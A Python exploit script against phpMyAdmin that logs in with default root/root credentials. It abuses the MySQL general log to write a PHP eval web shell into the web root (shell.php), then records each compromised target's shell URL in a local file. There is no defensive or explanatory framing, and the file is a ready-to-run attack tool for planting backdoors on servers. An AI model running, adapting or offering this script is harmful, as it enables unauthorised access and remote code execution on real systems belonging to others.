import requests
import re
import urllib
import sys



def getToken(url):
    
    content = requests.get(url)
    cookies = {}
    
    cookie = content.cookies._cookies
    values_list = re.findall("value='[0-9a-zA-Z%]+'",str(cookie))
    key_list = ['phpMyAdmin','pma_lang','pma_mcrypt_iv']
    for index,value in enumerate(values_list):
        value = re.findall("'(.*)'",value)
        cookies[key_list[index]] = urllib.unquote(value[0])

    content = content.text
    regx = 'token=[0-9a-f]+'
    find_token = re.findall(regx,content)
    token = find_token[0]
    token = token.replace("token=","")
    return token,cookies

def login(url,token,cookies):
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Content-Type":"application/x-www-form-urlencoded",
}
    data = {
        "pma_username":"root",
        "pma_password":"root",
        "token":token
    }


    login_data = requests.post(url,data=data,cookies=cookies,headers=headers)

    redirect_data = login_data.history[0]
    cookie_dict = redirect_data.cookies._cookies
    cookie_list = re.findall("value='[0-9a-zA-Z%]+'",str(cookie_dict))
    key_list = ["pmaUser-1","pmaPass-1",]
    for index,parm in enumerate(cookie_list):
        value = re.findall("value='(.*)'",parm)
        cookies[key_list[index]] = urllib.unquote(value[0])
    return cookies

def exp(cookies,sql,token,exec_sql_url):
    data = {
        "token":token,
        "sql_query":sql
    }
    #exec_sql_url = "http://192.168.10.173/phpmyadmin/import.php"
    get_req = requests.post(exec_sql_url,cookies=cookies,data=data)
    #print get_req.text
    
    
    

    

def phpmyadminExp(target):
    index_html = target + "/phpmyadmin/index.php"
    token,cookies = getToken(index_html)
    cookies = login(index_html,token,cookies)
    sql_url = target + "/phpmyadmin/import.php"
    sql_shell = ["set global general_log='on'","SET global general_log_file='C:/phpStudy/PHPTutorial/WWW/shell.php'","""select '<?php @eval($_POST["cmd"]);?>'"""]
    for sql in sql_shell:
        exp(cookies,sql,token,sql_url)
    shell = "%s/shell.php cmd" % target
    shell_txt = "../../../DB/Shell/%s.txt" % target.replace("http://","")
    write_shell = open(shell_txt,"w")
    write_shell.write(shell)
    write_shell.close()
    

def main():
    target = sys.argv[1]
    phpmyadminExp(target)

    
if __name__ == '__main__':
    main()
    

#phpmyadminExp("http://192.168.10.173/phpmyadmin/index.php")

